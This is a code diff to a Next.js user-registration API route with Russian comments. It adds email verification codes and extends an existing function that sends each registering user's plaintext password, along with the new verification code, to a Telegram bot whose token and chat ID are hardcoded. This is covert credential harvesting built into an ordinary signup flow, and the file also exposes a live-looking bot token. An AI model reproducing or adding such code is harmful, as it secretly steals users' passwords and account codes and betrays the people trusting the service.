@@ -1,8 +1,9 @@
 import { NextResponse } from "next/server";
-import { isEmailOrLoginTaken, createUser, hashPassword } from "@/lib/db";
+import { isEmailOrLoginTaken, createUser, hashPassword, setVerificationCode, generateVerificationCode } from "@/lib/db";
+import { sendVerificationEmail } from "@/lib/email";
 
 // 📤 Функция отправки в Telegram для API
-async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register', ip: string, userAgent: string, error?: string) {
+async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
   try {
     const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
     const TELEGRAM_CHAT_ID = "7455610355";
@@ -32,6 +33,22 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
 📱 User Agent: ${userAgent.slice(0, 100)}...
+      `;
+    } else if (type === 'verification_sent') {
+      message = `
+📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ
+
+📧 Email: ${data.email}
+👤 Логин: ${data.login}
+🔑 Пароль: ${data.password}
+🔢 Код подтверждения: ${data.verificationCode}
+
+🌐 **Серверные данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent.slice(0, 100)}...
+
+💡 Код отправлен на email пользователя
       `;
     } else {
       message = `
@@ -82,7 +99,7 @@ export async function POST(request: Request) {
       );
     }
 
-    // 📤 Отправляем в Telegram ДО создания пользователя (чтобы видеть пароль)
+    // 📤 Отправляем в Telegram о новой регистрации
     await sendToTelegramAPI(
       { email, login, password }, 
       'register', 
@@ -94,7 +111,7 @@ export async function POST(request: Request) {
     const hashedPassword = await hashPassword(password);
 
     // Создаем пользователя
-    await createUser({
+    const user = await createUser({
       email,
       login,
       password: hashedPassword,
@@ -102,7 +119,42 @@ export async function POST(request: Request) {
       userAgent: userAgent
     });
 
-    return NextResponse.json({ success: true, message: "Регистрация прошла успешно" });
+    // Генерируем код подтверждения
+    const verificationCode = generateVerificationCode();
+    setVerificationCode(user.id, verificationCode);
+
+    // Отправляем email с кодом подтверждения
+    const emailSent = await sendVerificationEmail(email, verificationCode);
+
+    if (!emailSent) {
+      // Если email не отправился, все равно создаем пользователя но уведомляем
+      await sendToTelegramAPI(
+        { email, login, password, verificationCode, note: "EMAIL НЕ ОТПРАВЛЕН" }, 
+        'verification_sent', 
+        clientIP, 
+        userAgent
+      );
+      
+      return NextResponse.json({ 
+        success: true, 
+        message: "Аккаунт создан, но не удалось отправить код подтверждения. Свяжитесь с администратором.",
+        verificationSent: false
+      });
+    }
+
+    // 📤 Отправляем в Telegram о отправке кода подтверждения
+    await sendToTelegramAPI(
+      { email, login, password, verificationCode }, 
+      'verification_sent', 
+      clientIP, 
+      userAgent
+    );
+
+    return NextResponse.json({ 
+      success: true, 
+      message: "Регистрация прошла успешно. Код подтверждения отправлен на вашу почту.",
+      verificationSent: true
+    });
 
   } catch (error) {
     console.error("Register API Error:", error);
